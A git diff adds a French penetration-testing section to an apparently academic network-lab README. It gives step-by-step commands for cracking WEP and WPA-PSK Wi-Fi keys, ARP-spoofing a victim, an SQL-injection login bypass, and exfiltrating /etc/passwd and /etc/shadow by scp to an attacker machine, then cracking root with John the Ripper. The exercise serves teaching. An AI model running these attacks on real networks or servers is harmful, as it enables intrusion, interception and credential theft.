@@ -19,6 +19,7 @@
   * [Configuration du VLAN 164](#configuration-du-vlan-164)
   * [Configuration du Wifi](#configuration-du-wifi)
 * [Machine virtuelle sur le serveur Capbreton](#machine-virtuelle-sur-le-serveur-capbreton)
+* [Tests d'intrusion](#tests-dintrusion)
 * [Résumé des séances](#résumé-des-séances)
 
 # Plan d'adressage
@@ -1233,6 +1234,191 @@ Il ne reste plus qu’à communiquer la partie publique de la KSK (présente dan
 
 ```
 dnssec-verify -o demineur.site db.demineur.site.signed
+```
+
+# Tests d'intrusion
+
+## Cassage de clef WEP d'un point d'accès Wifi
+
+* Installation des paquets nécessaires :
+```
+sudo apt-get install aircrack-ng pciutils
+```
+
+* Vérification du nom de la carte Wifi :
+```
+sudo airmon-ng
+```
+
+* Démarrer le mode de surveillance (monitor mode) sur la carte Wifi :
+```
+sudo airmon-ng start {Nom carte Wifi}
+```
+
+* Lancer une écoute de tout les paquets Wifi qui circulent :
+```
+sudo airodump-ng {Nom carte Wifi}
+```
+
+* Réaliser un test d'injection sur le point d'accès :
+```
+sudo aireplay-ng -9 -e {SSID} -a {MAC point d'accès} {Nom carte Wifi}
+```
+
+* Récupérer les vecteurs d'initialisation pour l'algorithme de cassage :
+```
+sudo airodump-ng -c 3 --bssid {MAC point d'accès} -w output {Nom carte Wifi}
+```
+
+* Associer la carte Wifi et le point d'accès :
+```
+sudo aireplay-ng -1 0 -e {SSID} -a {MAC point d'accès} -h {MAC carte Wifi} {Nom carte Wifi}
+```
+
+* Casser la clef WEP du point d'accès :
+```
+sudo aircrack-ng -b {MAC point d'accès} output*.cap
+```
+
+```
+KEY FOUND! [ 55:55:55:55:5A:BC:11:CB:A4:44:44:44:44 ] 
+Decrypted correctly: 100%
+```
+
+## Cassage du mot de passe WPA-PSK par force brute
+
+* Installation des paquets nécessaires :
+```
+sudo apt-get install aircrack-ng pciutils crunch
+```
+
+* Démarrer le mode de surveillance (monitor mode) sur la carte Wifi :
+```
+sudo airmon-ng start {Nom carte Wifi}
+```
+
+* Lancer une écoute de tout les paquets Wifi qui circulent :
+```
+sudo airodump-ng {Nom carte Wifi}
+```
+
+* Cibler la recherche vers le point d'accès :
+```
+airodump-ng -c 3 --bssid {MAC point d'accès} -w psk {Nom carte Wifi}
+```
+
+Il faut attendre de récupérer les données issues d'un handshake (émis lors de la connexion d'un utilisateur au PA).
+
+* Créer un dictionnaire de toutes les combinaisons décimales possibles sur 8 bits :
+```
+crunch 8 8 0123456789 -o dictionnaire
+```
+
+* Cassage de la PSK :
+```
+aircrack-ng -w dictionnaire -b {MAC point d'accès} psk*.cap
+```
+
+## Attaque du type "homme du milieu" par usurpation ARP :
+
+Sur la machine qui effectue l'attaque :
+
+* Activer le routage IPv4 :
+```
+sysctl -w net.ipv4.ip_forward=1
+```
+
+* Lancer l'empoisonnement du cache ARP de la victime :
+```
+arpspoof -i {Nom carte réseau} -t {Adresse IP victime} {Adresse IP passerelle}
+```
+
+* Vérifier la contamination du cache ARP sur la machine de la victime :
+```
+ip n
+```
+
+* Utiliser l'analyseur de réseau Wireshark (sniffer) pour visualiser le contenu des formulaires HTTP
+
+## Intrusion sur un serveur Web
+
+### Injection SQL :
+
+* Se rendre sur un site Web avec la chaîne ci-dessous comme identifiant et mot de passe : 
+```
+' OR 1 = 1 --
+```
+
+Soit la requête ci-dessous :
+```
+SELECT * FROM USERS WHERE ID='$id' AND PWD='$pwd'
+```
+
+Ainsi, l'injection SQL permet de commenter la partie de la requête pour le mot de passe et d'effectuer un OU avec une condition toujours vraie afin de récupérer toutes les informations de la base de données :
+```
+SELECT * FROM USERS WHERE ID='' OR 1 = 1 --' AND PWD='' OR 1 = 1 --'
+```
+
+### Accès à la base de données
+
+* Installation des paquets nécessaires :
+```
+sudo apt-get install dirb
+```
+
+* Analyse des fichiers du serveur Web :
+```
+dirb http://honey.plil.info
+```
+
+On remarque la présence du répertoire `phpmyadmin` sur le serveur.
+
+* Ouvrir l'URL `http://honey.plil.info/phpmyadmin` et essayer de se connecter avec les identifiants récupérés
+
+### Connexion au serveur
+
+* Installation des paquets nécessaires :
+```
+sudo apt-get install nmap
+```
+
+* Vérifier que le serveur est accessible à distance (analyse des ports) :
+```
+nmap -6 https://10.0.0.253
+```
+
+* Se connecter au serveur via `ssh` avec les identifiants récupérés dans la base de données :
+```
+ssh {Utilisateur}@{Adresse du serveur}
+```
+
+* Récupération des informations sur les utilisateurs :
+```
+scp /etc/passwd {Utilisateur pirate}@{Adresse machine pirate}:~/passwd
+scp /etc/shadow {Utilisateur pirate}@{Adresse machine pirate}:~/shadow
+```
+
+### Cassage du mot de passe root
+
+* Utilisation des commandes de l'utilitaire de John the Ripper.
+```
+unshadow ./passwd ./shadow | grep root > pass
+```
+
+* Création d'un dictionnaire (on sait que le mot de passe est la répétition d'un mot de 4 lettres deux fois) :
+```
+crunch 4 4 abcdefghijklmnopqrstuvwxyz > dico
+sed -i 's/\(.*\)/\1\1/' dico
+```
+
+* Cassage du mot de passe :
+```
+/usr/sbin/john -w:dico pass
+```
+
+* Visualisation du mot de passe en clair après quelques minutes :
+```
+/usr/sbin/john --show pass
 ```
 
 # Résumé des séances
